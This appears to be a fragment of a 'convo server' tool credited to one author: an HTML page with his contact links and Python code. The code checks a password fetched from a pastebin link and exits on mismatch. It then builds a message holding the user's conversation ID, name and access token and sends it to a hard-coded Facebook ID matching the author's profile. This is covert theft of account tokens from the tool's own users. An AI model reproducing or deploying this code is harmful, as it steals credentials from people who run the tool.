...
<head>
    ...
    <title>ABHAY CONVO SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>ABHAY CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:- ABHAY</p>
                <p>2. OWNER => ABHAY </p>
                <p>3. CONTACT:- <a href="https://wa.me/+917905494721">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100036389929808&mibextid=ZbWKwL">Facebook</a></p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/amqH8h4i').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By Abhay⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => Abhay  \n Hello legend chod Abhay sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100036389929808"]
